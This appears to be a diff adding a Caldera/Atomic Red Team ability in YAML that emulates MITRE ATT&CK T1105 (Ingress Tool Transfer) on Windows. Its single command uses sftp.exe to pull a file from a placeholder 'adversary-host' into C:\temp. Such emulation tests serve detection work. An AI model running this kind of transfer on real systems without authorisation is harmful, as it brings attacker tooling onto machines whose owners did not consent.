@@ -1,0 +1,19 @@
+---
+- id: 08b8bde13d237447d1881d3b59685fe4
+  name: Windows pull file using sftp.exe
+  description: 'This test simulates pulling files using SFTP on a Windows environment.
+
+    '
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    windows:
+      psh:
+        command: sftp.exe adversary@adversary-host:/tmp/T1105.txt C:\temp
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
